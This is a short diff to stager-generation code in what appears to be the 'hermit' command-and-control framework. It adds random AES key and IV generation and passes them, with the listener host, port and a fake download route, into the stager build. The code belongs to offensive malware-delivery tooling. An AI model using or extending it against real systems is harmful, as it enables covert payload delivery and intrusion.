@@ -6,6 +6,7 @@ import (
 	"slices"
 
 	"github.com/google/uuid"
+	"github.com/hideckies/hermit/pkg/common/crypt"
 	"github.com/hideckies/hermit/pkg/common/meta"
 	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
 	"github.com/hideckies/hermit/pkg/common/utils"
@@ -92,6 +93,12 @@ func (s *Stager) Generate(serverState *state.ServerState) (data []byte, outFile 
 	// Get request path
 	requestPathDownload := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/stager/download"])
 
+	// Generate random AES key and IV
+	newAES, err := crypt.NewAES()
+	if err != nil {
+		return nil, "", err
+	}
+
 	// Change to the paylaod directory
 	if s.Os == "linux" {
 		return nil, "", fmt.Errorf("linux target is not implemented yet")
@@ -117,6 +124,8 @@ func (s *Stager) Generate(serverState *state.ServerState) (data []byte, outFile 
 			fmt.Sprintf("-DLISTENER_HOST=\"%s\"", s.Lhost),
 			fmt.Sprintf("-DLISTENER_PORT=%s", fmt.Sprint(s.Lport)),
 			fmt.Sprintf("-DREQUEST_PATH_DOWNLOAD=\"%s\"", requestPathDownload),
+			fmt.Sprintf("-DAES_KEY_BASE64=\"%s\"", newAES.Key.Base64),
+			fmt.Sprintf("-DAES_IV_BASE64=\"%s\"", newAES.IV.Base64),
 			"-S.",
 			"-Bbuild",
 		)
